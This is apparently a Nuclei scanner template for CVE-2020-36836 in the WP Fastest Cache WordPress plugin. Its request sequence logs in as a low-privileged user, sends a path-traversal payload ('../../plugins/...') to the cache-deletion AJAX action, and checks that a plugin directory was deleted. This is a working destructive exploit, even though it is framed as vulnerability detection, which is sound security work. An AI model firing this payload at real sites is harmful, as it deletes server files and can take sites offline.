id: CVE-2020-36836

info:
  name: WordPress WP Fastest Cache <= 0.9.0.2 - Authenticated Arbitrary File Deletion
  author: hnd3884
  severity: high
  description: |
    The WP Fastest Cache plugin for WordPress is vulnerable to arbitrary file deletion in versions up to,
    and including, 0.9.0.2. This issue occurs due to insufficient path validation and lack of capability
    checks. Authenticated attackers with minimal permissions (such as a subscriber) can exploit this
    vulnerability to delete arbitrary files on the server, potentially leading to denial of service or
    further compromise.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-36836
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/ed6e699a-775e-4c59-a266-874eab5fa3a6
    - https://plugins.trac.wordpress.org/changeset/2342347/wp-fastest-cache
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2020-36836
    cwe-id: CWE-22
    epss-score: 0.00205
    cpe: cpe:2.3:a:wpfastestcache:wp_fastest_cache:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    vendor: wpfastestcache
    product: wp_fastest_cache
    publicwww-query: "wp-content/plugins/wp-fastest-cache/"
  tags: cve,cve2020,wordpress,wp-fastest-cache,file-deletion,auth

flow: |
  http('check-access') && http('login') && http('clear-cache') && http('verify-clearance')

http:
  - id: check-access
    method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/wp-fastest-cache/languages/"
    matchers:
      - type: status
        status:
          - 200
        internal: true

  - id: login
    method: POST
    path:
      - "{{BaseURL}}/wp-login.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Origin: "{{BaseURL}}"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    body: "log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to=%2fwp-admin%2f&testcookie=1"
    matchers:
      - type: status
        status:
          - 200
        internal: true
    extractors:
      - type: regex
        name: auth_cookie
        part: header
        internal: true
        regex:
          - "Set-Cookie: (.*?);"

  - id: clear-cache
    method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?path=/../../plugins/wp-fastest-cache/languages&action=wpfc_delete_current_page_cache"
    headers:
      Cookie: "{{auth_cookie}}"
    matchers:
      - type: word
        part: body
        words:
          - "The cache of page has been cleared"
        internal: true

  - id: verify-clearance
    method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/wp-fastest-cache/languages/"
    matchers:
      - type: status
        status:
          - 404
